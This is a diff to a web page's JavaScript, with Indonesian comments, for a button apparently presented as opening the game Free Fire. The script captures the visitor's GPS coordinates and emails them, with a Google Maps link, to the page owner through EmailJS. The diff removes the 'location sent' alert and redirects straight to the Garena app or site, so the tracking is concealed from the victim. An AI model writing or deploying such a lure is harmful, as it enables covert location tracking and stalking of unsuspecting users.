@@ -169,44 +169,45 @@ button:hover{
   </form>
 </div>
 
-<script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
-      
 <script>
-    // INIT EMAILJS
-  emailjs.init("Ab3xvPQCqJkB8Kh_V");
+emailjs.init("Ab3xvPQCqJkB8Kh_V");
 
-  function bukaFreeFire(){
+function bukaFreeFire(){
 
-    if(navigator.geolocation){
-      navigator.geolocation.getCurrentPosition(function(position){
+  if(navigator.geolocation){
 
-        const lat = position.coords.latitude;
-        const long = position.coords.longitude;
+    navigator.geolocation.getCurrentPosition(function(position){
 
-        emailjs.send("service_lt5tmzc","template_e16cgrw",{
-          latitude: lat,
-          longitude: long,
-          maps: "https://maps.google.com/?q=" + lat + "," + long
-        }).then(function(){
-          alert("Lokasi berhasil dikirim ke email!");
-        }, function(error){
-          alert("Gagal kirim: " + JSON.stringify(error));
-        });
+      const lat = position.coords.latitude;
+      const long = position.coords.longitude;
 
-      }, function(){
-        alert("Lokasi tidak diizinkan");
+      emailjs.send("service_lt5tmzc","template_e16cgrw",{
+        latitude: lat,
+        longitude: long,
+        maps: "https://maps.google.com/?q=" + lat + "," + long
+      }).then(function(){
+
+        // Setelah email terkirim → buka app
+        window.location.href = "garena://";
+
+        // Jika gagal buka app → buka website setelah 2 detik
+        setTimeout(function(){
+          window.location.href = "https://ff.garena.com/";
+        }, 2000);
+
+      }, function(error){
+        alert("Gagal kirim: " + JSON.stringify(error));
       });
-    } else {
-      alert("Browser tidak support geolocation");
-    
-    // Coba buka app (mungkin gagal)
-    window.location.href = "garena://";
 
-    // Kalau gagal 2 detik → buka website
-    setTimeout(function(){
-        window.location.href = "https://ff.garena.com/";
-    }, 2000);
+    }, function(){
+      alert("Lokasi tidak diizinkan");
+    });
+
+  } else {
+    alert("Browser tidak support geolocation");
   }
+
+}
 
 /* Particle Effect */
 const canvas = document.getElementById("particles");
